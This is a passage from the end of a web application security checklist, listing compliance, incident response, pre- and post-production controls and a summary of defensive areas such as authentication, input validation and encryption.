- [ ] HIPAA: Encrypt PHI at rest and in transit (if applicable)
- [ ] SOC 2: Access control reviews quarterly
- [ ] Privacy policy and terms of service published

#### Incident Response
- [ ] Document security incident response plan
- [ ] Define roles (incident commander, communications, tech lead)
- [ ] Establish communication channels (Slack, PagerDuty)
- [ ] Practice incident response drills quarterly
- [ ] Maintain list of emergency contacts
- [ ] Define SLAs for severity levels (P0: 15min, P1: 1hr, P2: 4hr)

---

## Quick Reference: Security Checklist

### Pre-Production

- [ ] All secrets in environment variables, not code
- [ ] HTTPS enforced with HSTS header
- [ ] Database encryption enabled
- [ ] File uploads validated and scanned
- [ ] Rate limiting on all public endpoints
- [ ] CSRF protection on state-changing endpoints
- [ ] Input validation on all user input
- [ ] Authentication required for protected routes
- [ ] Authorization checks on all resources
- [ ] Security headers configured (helmet)
- [ ] Error messages don't leak sensitive info
- [ ] Logging and monitoring active
- [ ] Dependencies scanned for vulnerabilities
- [ ] Backups encrypted and tested

### Post-Production

- [ ] Monitor logs for suspicious activity
- [ ] Review access logs weekly
- [ ] Rotate secrets quarterly
- [ ] Update dependencies monthly
- [ ] Penetration test annually
- [ ] Security audit semi-annually
- [ ] Incident response plan reviewed quarterly
- [ ] Employee security training annually

---

## Summary

This checklist covers production-ready security controls across:

✅ **Authentication**: Password security, session management, MFA, account lockout  
✅ **Authorization**: RBAC, resource-level checks, API keys  
✅ **Input Validation**: Schema validation, SQL injection prevention, XSS protection  
✅ **Rate Limiting**: API limits, brute force prevention, DDoS mitigation  
✅ **File Upload Security**: Type validation, virus scanning, secure storage  
✅ **Data Encryption**: At rest, in transit, key management  
✅ **Attack Vector Prevention**: CSRF, IDOR, SSRF, timing attacks, mass assignment  
✅ **Compliance**: GDPR, PCI DSS, audit logging, incident response  

**Next Steps**:
1. Review existing codebase against checklist
2. Implement missing controls (prioritize high-risk items)
3. Add security tests to CI/CD pipeline
4. Schedule regular security audits
5. Train team on secure coding practices
